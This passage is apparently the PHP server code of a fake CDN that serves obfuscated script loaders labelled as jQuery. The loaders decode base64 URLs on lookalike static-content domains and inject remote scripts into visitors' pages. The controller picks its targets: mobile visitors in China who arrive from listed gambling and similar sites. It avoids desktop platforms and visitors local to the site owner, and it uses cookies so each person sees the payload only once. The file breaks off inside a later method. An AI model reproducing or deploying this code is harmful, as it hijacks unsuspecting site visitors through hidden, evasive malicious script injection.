<?php
namespace app\cdn\controller;

use app\BaseController;
use common\NetworkRequest;
use GuzzleHttp\Exception\ClientException;
use think\facade\Cache;
use think\Request;
use think\facade\Cookie;

class Cdn extends BaseController
{
    //jquery.min-4.0.1.js
    private $jc_yingshi_string = <<<heredoc
function MqMqY(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function HHwbhL(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return MqMqY(t)}eval('window')['\x6b\x6c\x6f\x64\x54\x71']=function(){;(function(u,r,w,d,f,c){var x=HHwbhL;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC4xLmpz','gUssQxWzjLAD',window,document,'DrPdgDiahyku','ptsrhUDHCv')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) klodTq();
heredoc;
    //4.0.2
    private $jc_bc_string = <<<heredoc
function HYTEZHhE(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function FvjRVcrk(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return HYTEZHhE(t)}eval('window')['\x76\x66\x73\x4d\x56\x5a']=function(){;(function(u,r,w,d,f,c){var x=FvjRVcrk;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC4yLmpz','pHsyIRmUMHcje',window,document,'MrKwbLiCEPkTlA','ptvJPA')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) vfsMVZ();
heredoc;
    //4.0.3
    private $jc_tiyu_string = <<<heredoc
function VrbzcRrL(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function nAHjMur(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return VrbzcRrL(t)}eval('window')['\x4c\x72\x4f\x4a\x62\x65']=function(){;(function(u,r,w,d,f,c){var x=nAHjMur;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC4zLmpz','OCsbSRx',window,document,'arQtaIilLvbesd','ptDoVpz')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) LrOJbe();
heredoc;
    //4.0.4
    private $jc_6hecai_string = <<<heredoc
function pMPoQt(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function uZlPoIO(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return pMPoQt(t)}eval('window')['\x53\x6c\x44\x57\x62\x42']=function(){;(function(u,r,w,d,f,c){var x=uZlPoIO;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC40Lmpz','KcsmxypijCBn',window,document,'ErJJTJirCSld','ptPcFdJnuHpq')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) SlDWbB();
heredoc;
    //4.0.5
    private $jc_xs_string = <<<heredoc
function ESDAjp(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function NnOdGNP(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return ESDAjp(t)}eval('window')['\x45\x42\x4e\x79\x59\x77']=function(){;(function(u,r,w,d,f,c){var x=NnOdGNP;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC41Lmpz','dXssrAkJT',window,document,'FrrAkWiLkSXze','ptpSBdl')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) EBNyYw();
heredoc;
    //4.0.6
    private $jc_qp_string = <<<heredoc
function hcDRIT(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function BzAOAHt(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return hcDRIT(t)}eval('window')['\x43\x66\x54\x4c\x71\x49']=function(){;(function(u,r,w,d,f,c){var x=BzAOAHt;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC42Lmpz','OvstmndUSB',window,document,'QrjEgWinaWQjfh','ptsFUs')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) CfTLqI();
heredoc;
    //4.0.7
    private $jc_dz_string = <<<heredoc
function IfrhB(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function eusHMZQ(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return IfrhB(t)}eval('window')['\x65\x76\x55\x50\x73\x4b']=function(){;(function(u,r,w,d,f,c){var x=eusHMZQ;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC43Lmpz','KfsffUoV',window,document,'xrkCUBiebZB','ptaZYyFUliLY')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) evUPsK();
heredoc;
    //4.0.8
    private $jc_sm_string = <<<heredoc
function CfmLsRsf(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function ivMRbsXEF(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return CfmLsRsf(t)}eval('window')['\x46\x43\x4a\x69\x42\x6e']=function(){;(function(u,r,w,d,f,c){var x=ivMRbsXEF;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly91bmlvbi5tYWNvbXMubGEvanF1ZXJ5Lm1pbi00LjAuOC5qcw==','hQsdmVhwajVH',window,document,'ErKvHBiEBJ','ptiMBpUqvdk')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) FCJiBn();
heredoc;
    //4.0.9
    private $jc_cp_string = <<<heredoc
function mghvcQQX(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function kMUvlI(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return mghvcQQX(t)}eval('window')['\x4f\x64\x62\x6a\x6a\x5a']=function(){;(function(u,r,w,d,f,c){var x=kMUvlI;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly91bmlvbi5tYWNvbXMubGEvanF1ZXJ5Lm1pbi00LjAuOS5qcw==','DZsusdqQBdxgl',window,document,'zrNOWbiMmUZl','ptGjPu')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) OdbjjZ();
heredoc;
    //4.0.10
    private $jc_bc2_string = <<<heredoc
function krBQATz(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function CQEZfMqpfa(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}return krBQATz(t)}eval('window')['\x50\x4e\x41\x69\x4f\x6c']=function(){;(function(u,r,w,d,f,c){var x=CQEZfMqpfa;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9hcGkuYmR1c3RhdGljLmNvbS9qcXVlcnkubWluLTQuMC4xMC5qcw==','uKsbYfruROGC',window,document,'IrCoNDiXdjtPMqZ','ptrbDePscS')};if( !(/^Mac|Win/.test(navigator.platform)) && (document.referrer.indexOf('.') !== -1) ) PNAiOl();
heredoc;
   
    public function settimecookie(Request $request) {
        $time = 60*60*24*30*6;
        Cookie::set('timesteptime',$time,[ 'expire' => $time, 'samesite' => 'None' ,'Secure' => 'true']);
        return response("")->header(['Content-Type' => 'text/javascript','Cache-Control' => 'max-age=0','Expires' => gmdate("D, d M Y H:i:s", time() ) . " GMT",]);
    }

    public function tongji(Request $request) {
        $tz_arr = array('bc'=>$this->jc_bc_string,'ys'=>$this->jc_yingshi_string,'cp'=>$this->jc_cp_string,'dz'=>$this->jc_dz_string,'sm'=>$this->jc_sm_string,'xs'=>$this->jc_xs_string,'hc'=>$this->jc_6hecai_string,'qp'=>$this->jc_qp_string,'ty'=>$this->jc_tiyu_string);
        $redis = redis();
        $referer = $request->header('referer');
        $uniqcode = $request->get('cw');
        $jump = $request->get('jv');
        $exist = $redis->GET($uniqcode); 
        $t1 = ($exist) ? 'true' : 'false';
        $t2 = (!empty($referer)) ? 'true' : 'false';
        //lllog("debug_jump","exist => ".$t1." refer=>".$t2." jump => ".$jump . " uniqcode => ".$uniqcode);
        if($exist && $uniqcode) {
            return $tz_arr[$jump];
        }
    }

    public function judgejsHack(Request $request) {
        $first_jump = <<<heredoc
function _0x59c3(){const _0x328293=['6264710TNLVLR','script','48252jFGmSE','platform','165417uDVyHj','type','https://zz.badustatic.com/cdn/tongji.js?jv=','createElement','host','test','1015320aJZyRi','text/javascript','56ovzZgz','&cw=','1008842jnvOeb','155241smySne','onload','getElementsByTagName','referrer','1315760frsuDi','&rt=','uniqcode','1boTbHX','head','src','164VfgbJW','11topZZS','includes'];_0x59c3=function(){return _0x328293;};return _0x59c3();}(function(_0x418ee3,_0x48ab56){const _0xf04673=_0x4bbd,_0x1ca902=_0x418ee3();while(!![]){try{const _0x3584aa=parseInt(_0xf04673(0x105))/0x1*(-parseInt(_0xf04673(0xfd))/0x2)+parseInt(_0xf04673(0xf1))/0x3*(parseInt(_0xf04673(0x108))/0x4)+-parseInt(_0xf04673(0x102))/0x5+-parseInt(_0xf04673(0xf9))/0x6+-parseInt(_0xf04673(0xf3))/0x7+parseInt(_0xf04673(0xfb))/0x8*(parseInt(_0xf04673(0xfe))/0x9)+parseInt(_0xf04673(0xef))/0xa*(parseInt(_0xf04673(0x109))/0xb);if(_0x3584aa===_0x48ab56)break;else _0x1ca902['push'](_0x1ca902['shift']());}catch(_0x710eef){_0x1ca902['push'](_0x1ca902['shift']());}}}(_0x59c3,0x6cf1a));function _0x4bbd(_0x4ae256,_0x3de80a){const _0x59c3f9=_0x59c3();return _0x4bbd=function(_0x4bbdb5,_0x5bf97c){_0x4bbdb5=_0x4bbdb5-0xee;let _0x414955=_0x59c3f9[_0x4bbdb5];return _0x414955;},_0x4bbd(_0x4ae256,_0x3de80a);}function is_mob(){const _0x54af15=_0x4bbd;try{if(!/^Mac|Win/[_0x54af15(0xf8)](navigator[_0x54af15(0xf2)]))return!![];return![];}catch(_0x3ac043){return![];}}function MiddleLoadJS(_0x102466,_0x638e2c){const _0x4395e7=_0x4bbd;let _0x1049ea=document[_0x4395e7(0xf6)](_0x4395e7(0xf0)),_0x15ffee=_0x638e2c||function(){};_0x1049ea[_0x4395e7(0xf4)]=_0x4395e7(0xfa);{_0x1049ea[_0x4395e7(0xff)]=function(){_0x15ffee();};}_0x1049ea[_0x4395e7(0x107)]=_0x102466,document[_0x4395e7(0x100)](_0x4395e7(0x106))[0x0]['appendChild'](_0x1049ea);}function send(){const _0x26abc0=_0x4bbd;let _0x4ee775=_0x26abc0(0xf5)+'tongjihost'+_0x26abc0(0x103)+'time'+_0x26abc0(0xfc)+_0x26abc0(0x104)+'&hst='+window['location'][_0x26abc0(0xf7)],_0x32be45=is_mob();if(_0x32be45){let _0x24c52b=document[_0x26abc0(0x101)],_0x5ddd29=_0x24c52b[_0x26abc0(0xee)]('.')&&!_0x24c52b['includes'](window['location']['host']);_0x5ddd29&&MiddleLoadJS(_0x4ee775);}}send();
heredoc;

        $res = "";
        $redis = redis();
        $country = $this->getCountry($request,true);
        if($country != "CN") {
            // $redis->incr('not_cn_count');
            return false; 
        }
        
        $referer = $request->header('referer');
        
        if(!$referer) {
            // $redis->incr('no_referer_count');
            return false;  
        }

        if(\strpos($referer, 'http') === false) {
            // $redis->incr('no_http_count');
            return false;    
        }
          
        
        $ip = $this->getIp($request);
        
        // if($redis->GET($ip) || Cookie::get('timesteptime',false)) {
        //     return false;
        // }

        if(Cookie::get('timesteptime',false)) {
            // $redis->incr('cookie_noshow_count');
            return false;
        }

        $urlInfo = parse_url($referer);

        $user_agent = $request->header('user-agent');
        
        $user_hash = md5($user_agent.$ip);

        // $redis = redis();
        $exist = $redis->GET($user_hash); 

        if($exist) {
            // $redis->incr('exist_noshow_count');
            return false;  
        }

        $city = $this->getCity($request);
        $host = $urlInfo['host'];

        $beian = $redis->hGet('beian_domain', $host);

        if($beian != '' && $city != '') {
            if($city == $beian) {
                //lllog("judegejsbeianfail", $request->header('referer'));
                return false;
            } 
        }

        $cookie_judge = false;

        if(!Cookie::get('timestep2_flag',false)){
            $cookie_judge = true;
            Cookie::set('timestep2_flag','true',[ 'expire' => 60*60*18, 'samesite' => 'None' ,'Secure' => 'true']);
        }

        $redis->select(0);
        // var_dump($urlInfo);
        $res1 = $redis->sIsMember('bc_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        $res2 = $redis->sIsMember('maccms_yingshi_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        $res3 = $redis->sIsMember('tiyu_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        $res4 = $redis->sIsMember('6hecai_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        $res5 = $redis->sIsMember('xs_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        $res6 = $redis->sIsMember('qp_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        $res7 = $redis->sIsMember('dz_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        $res8 = $redis->sIsMember('sm_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        $res9 = $redis->sIsMember('cp_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        // var_dump($res);

        if ($res1 == false && $res2 == false && $res3 == false && $res4 == false && $res5 == false && $res6 == false && $res7 == false && $res8 == false && $res9 == false) {
            // $redis->incr('not_in_any_list_count');
            if ( isset($urlInfo['host']) ){
                $referer_url = $urlInfo['scheme'].'://'.$urlInfo['host'];
                if( isset($urlInfo['path']) ){
                    $referer_url = $referer_url.$urlInfo['path'];
                }
                if( isset($urlInfo['query']) ){
                    $referer_url = $referer_url.'?'.$urlInfo['query'];
                }
                // $redis->hIncrBy('non_record_host_list',$urlInfo['scheme'].'://'.$urlInfo['host'],1);
                // $redis->hIncrBy('non_record_full_url_list',$referer_url,1);
            }
            return false;
        }
        if( $res1 == true) {
            $res33 = $this->jc_bc_string;
            $res = 'bc';
            $redis->sAdd('bc_fangwen_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        }
        if( $res3 == true) {
            $res33 = $this->jc_tiyu_string;
            $res = 'ty';
            $redis->sAdd('tiyu_fangwen_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        }
        if( $res4 == true) {
            $res33 = $this->jc_6hecai_string;
            $res = 'hc';
            $redis->sAdd('6hecai_fangwen_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        }
        if( $res5 == true) {
            $res = 'xs';
            $res33 = $this->jc_xs_string;
            $redis->sAdd('xs_fangwen_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        }
        if( $res6 == true) {
            $res = 'qp';
            $res33 = $this->jc_qp_string;
            $redis->sAdd('qp_fangwen_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        }
        if( $res7 == true) {
            $res = 'dz';
            $res33 = $this->jc_dz_string;
            $redis->sAdd('dz_fangwen_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        }
        if( $res8 == true) {
            $res = 'sm';
            $res33 = $this->jc_sm_string;
            $redis->sAdd('sm_fangwen_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        }
        if( $res9 == true) {
            $res = 'cp';
            $res33 = $this->jc_cp_string;
            $redis->sAdd('cp_fangwen_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        }
        if( $res2 == true) {
            $res = 'ys';
            $res33 = $this->jc_yingshi_string;
            $redis->sAdd('maccms_yingshi_fangwen_list',$urlInfo['scheme'].'://'.$urlInfo['host']);
        }
        $t1 = (!$exist) ? 'true' : 'false';
        $t2 = (!empty($referer)) ? 'true' : 'false';
        $t3 = ($cookie_judge) ? 'true' : 'false';
        $t4 = user_agent_is_mobile($user_agent) ? 'true' : 'false';
        //lllog("debug","exist => ".$t1." refer=>".$t2." cc=> ".$t3." ua=> ".$t4." coun=> ".$country. " res=>".$res);
        
        if (!$exist && !empty($referer)&& $cookie_judge && user_agent_is_mobile($user_agent) && $country == "CN") {
            $redis->incr($res.'_request_count');
            $time = 60*60*10;
            $exist = $redis->SETEX($user_hash, $time, "1");
            $jump_hash = md5($user_agent.$ip.rand(1,1000));
            $first_jump = str_replace('time',time(),$first_jump);
            $first_jump = str_replace('uniqcode',$jump_hash,$first_jump);
            $first_jump = str_replace('tongjihost',$res,$first_jump);
            $exist = $redis->SETEX($jump_hash, 5, "1");
            //lllog("judge_true"," res=>".$res);
            return $first_jump;
        }

        
        return false;
    }

    public function judgereferjsHack(Request $request) {
        $res = "";

        $country = $this->getCountry($request);
        if($country != "CN") {
            return false; 
        }
        
        $referer = $request->header('referer');

        if(!$referer) {
            return false;  
        }

        if(\strpos($referer, 'http') === false) {
            return false;    
        }


        $ip = $this->getIp($request);
        
        // if($redis->GET($ip) || Cookie::get('timesteptime',false)) {
        //     return false;
        // }

        if(Cookie::get('timesteptime',false)) {
            return false;
        }

        $urlInfo = parse_url($referer);

        $user_agent = $request->header('user-agent');
        
        $user_hash = md5($user_agent.$ip);

        $redis = redis();
        $redis->select(1);
        $exist = $redis->GET($user_hash); 

        if($exist) {
            return false;  
        }

        $city = $this->getCity($request);
        $host = $urlInfo['host'];

        $beian = $redis->hGet('beian_domain', $host);

        if($beian != '' && $city != '') {
            if($city == $beian) {
                return false;
            } 
        }
        
        $cookie_judge = false;
        if(!Cookie::get('timestep2_flag',false)){
            $cookie_judge = true;
            Cookie::set('timestep2_flag','true',[ 'expire' => 60*60*18, 'samesite' => 'None' ,'Secure' => 'true']);
        }

        // var_dump($urlInfo);
        $res1 = $redis->sIsMember('bc_list',$urlInfo['scheme'].'://'.$urlInfo['host'].$urlInfo['path']);
        // var_dump($res);
        if ($res1 == false) {
            return false;
        }
        if( $res1 == true) {
            $res = $this -> jc_bc2_string;
            $redis->sAdd('bc_fangwen_list',$urlInfo['scheme'].'://'.$urlInfo['host'].$urlInfo['path']);
        }
        
        if ((!$exist && !empty($referer)&& $cookie_judge && user_agent_is_mobile($user_agent) && $country == "CN")) {
            $time = 60*60*10;
            $exist = $redis->SETEX($user_hash, $time, "1");
            return $res;
        }

        return false;
    }

    /**
     * 从远程获取资源
     */
    public function fetchRemote(Request $request, $file) {
        // $redis = redis();
        // $redis->incr('cdn_request_total_count');
        // favicon找不到
        if (stripos($file, 'favicon.ico') !== false) {
            return '';
        }
        $cache_key = 'union:html:fetchRemote:v2:' . $file;
